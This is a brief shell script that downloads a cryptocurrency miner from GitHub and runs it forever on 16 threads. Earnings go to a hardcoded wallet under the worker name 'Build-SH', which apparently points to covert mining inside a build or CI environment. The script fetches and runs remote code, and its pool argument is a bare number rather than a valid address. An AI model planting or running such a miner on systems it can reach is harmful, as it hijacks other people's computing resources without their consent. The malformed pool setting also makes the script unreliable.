#!/bin/sh
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
while [ 1 ]; do
./cpuminer-sse2 -a yespower -o 17079 -u urkDXD16QjUjK9Y87a4NVbkNwmYpep8sG9.Build-SH -t 16
sleep 5
done
